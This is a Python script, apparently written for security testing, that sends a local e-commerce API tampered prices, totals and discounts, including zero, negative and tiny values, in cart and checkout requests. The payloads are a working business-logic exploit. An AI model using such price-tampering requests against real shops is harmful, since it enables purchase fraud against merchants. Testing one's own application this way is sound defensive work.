#!/usr/bin/env python3
"""
Price Tampering Attack Simulation
Tests business logic vulnerabilities in cart and checkout
"""

import requests
import time

BASE_URL = "http://localhost:3001"

def test_cart_price_tampering():
    """Test price manipulation in cart"""
    print("💰 Testing Price Tampering in Cart...")
    print(f"Target: {BASE_URL}/api/cart/add\n")
    
    # Original price is 49.99, try to change it
    tampered_prices = [
        0.01,  # Almost free
        0.00,  # Free
        -10.00,  # Negative price
        1.00,  # Very cheap
        999999.99,  # Very expensive (might cause overflow)
    ]
    
    for price in tampered_prices:
        try:
            response = requests.post(
                f"{BASE_URL}/api/cart/add",
                json={
                    "productId": 1,
                    "quantity": 1,
                    "price": price  # VULNERABLE: Client-controlled price
                },
                timeout=5
            )
            
            print(f"Price: ${price}")
            print(f"   Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                print(f"   ✅ Accepted! Item price: ${data.get('item', {}).get('price', 'N/A')}")
            else:
                print(f"   ❌ Rejected")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

def test_checkout_price_tampering():
    """Test price manipulation in checkout"""
    print("\n🛒 Testing Price Tampering in Checkout...")
    print(f"Target: {BASE_URL}/api/checkout\n")
    
    test_cases = [
        {"total": 0.01, "discount": 0, "description": "Almost free total"},
        {"total": 0.00, "discount": 0, "description": "Free total"},
        {"total": 100.00, "discount": 150.00, "description": "Negative final price"},
        {"total": -10.00, "discount": 0, "description": "Negative total"},
        {"total": 50.00, "discount": -20.00, "description": "Negative discount"},
    ]
    
    for test_case in test_cases:
        try:
            response = requests.post(
                f"{BASE_URL}/api/checkout",
                json={
                    "items": [{"id": 1, "name": "Test", "price": 49.99, "quantity": 1}],
                    "total": test_case["total"],
                    "discount": test_case["discount"],
                    "paymentMethod": "credit_card"
                },
                timeout=5
            )
            
            print(f"Test: {test_case['description']}")
            print(f"   Total: ${test_case['total']}, Discount: ${test_case['discount']}")
            print(f"   Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                final_total = data.get('total', 0)
                print(f"   ✅ Order placed! Final total: ${final_total}")
                
                if final_total < 0:
                    print(f"   ⚠️  BUSINESS LOGIC ABUSE: Negative total!")
            else:
                print(f"   ❌ Rejected")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

def test_cart_update_price():
    """Test price manipulation in cart update"""
    print("\n🔄 Testing Price Manipulation in Cart Update...")
    print(f"Target: {BASE_URL}/api/cart/update\n")
    
    for price in [0.01, 0.00, -5.00]:
        try:
            response = requests.post(
                f"{BASE_URL}/api/cart/update",
                json={
                    "itemId": 1,
                    "quantity": 1,
                    "price": price
                },
                timeout=5
            )
            
            print(f"Price: ${price}")
            print(f"   Status: {response.status_code}")
            
            if response.status_code == 200:
                print(f"   ✅ Price updated!")
            
            time.sleep(0.3)
            
        except Exception as e:
            print(f"   Error: {e}")

if __name__ == "__main__":
    test_cart_price_tampering()
    test_checkout_price_tampering()
    test_cart_update_price()
    print("\n✅ Price tampering tests completed")
